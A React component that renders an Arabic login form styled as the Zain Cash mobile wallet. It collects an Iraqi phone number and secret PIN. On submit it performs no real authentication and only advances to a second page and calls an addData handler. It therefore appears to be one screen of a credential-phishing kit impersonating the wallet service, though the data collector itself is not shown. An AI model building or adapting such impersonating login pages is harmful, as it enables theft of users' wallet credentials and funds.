import { useEffect, useState } from "react";

const MainPage = (props: any) => {
  const [show, setShow] = useState(true);
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  useEffect(() => {
    if (show) {
      setTimeout(() => setShow(false), 113000000);
    }
  }, []);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPhone(e.target.value);
    setPhoneError("");
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    setPasswordError("");
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!/^\+9647[0-9]{8}$/.test(phone)) {
      setPhoneError("رقم الهاتف غير صالح");
      return;
    }

    if (password.length < 6) {
      setPasswordError("كلمة المرور يجب أن تكون على الأقل 6 أحرف");
      return;
    }

    props.handleActivePage(2);
    props.addData();
  };

  return (
    <div
      style={{
        background: show ? "rgba(22,0,0,0.5)" : "",
        height: "100vh",
        width: "100%",
      }}
    >
      <form className="form unke" onSubmit={handleSubmit}>
        <div style={{ display: "flex", flexDirection: "column" }}>
          <label style={{ color: "gray", fontWeight: 600, fontSize: 13 }}>
            ادخل رقم الهاتف
          </label>
          <input
            placeholder="+964"
            dir="ltr"
            style={{
              padding: 1,
              margin: 10,
              height: 25,
              width: "70vw",
              border: "none",
              borderBottom: "#f1f1f1 1px solid",
            }}
            id="input1"
            type="tel"
            maxLength={13}
            required
            onChange={handlePhoneChange}
          />
          <label style={{ color: "red", fontSize: 12 }}>
            {phoneError && phoneError}
          </label>
          <label style={{ color: "gray", fontWeight: 600, fontSize: 13 }}>
            ادخل الرمز السري
          </label>
          <input
            placeholder="الرمز السري"
            style={{
              padding: 1,
              margin: 10,
              height: 25,
              width: "70vw",
              border: "none",
              borderBottom: "#f1f1f1 1px solid",
            }}
            id="input2"
            type="tel"
            maxLength={12}
            required
            onChange={handlePasswordChange}
          />
          <label style={{ color: "red", fontSize: 12 }}>
            {passwordError && passwordError}
          </label>
        </div>
        <div>
          <button
            style={{ fontSize: 15, fontWeight: 600 }}
            className="action"
            type="submit"
          >
            تسجيل الدخول
          </button>
          <div style={{ marginTop: 13, fontSize: 13, fontWeight: 600 }}>
            {" "}
            غير مسجل مع خدمة زين كاش ؟
          </div>
        </div>
      </form>
    </div>
  );
};

export default MainPage;
